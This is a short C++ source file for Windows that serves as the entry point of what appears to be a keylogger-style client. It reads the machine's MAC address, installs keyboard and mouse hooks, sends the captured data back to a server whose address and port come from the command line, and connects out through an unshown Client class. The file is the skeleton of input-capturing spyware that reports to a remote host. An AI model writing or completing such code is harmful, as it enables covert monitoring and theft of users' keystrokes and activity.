#include <windows.h>
#include <iostream>
#include <thread>
#include "Client.h"

Client clt;

void	call_sendBackMessage(void)
{
	clt.getMACAddress();
	clt.setKeyboardHook();
	clt.setMouseHook();
	clt.sendBackMessage();
}

int main(int ac, char **av)
{
	std::thread getevent(&call_sendBackMessage);
	if (ac != 3)
		return (1);
	clt.run(av[1], av[2]);
	getevent.join();
	return (0);
}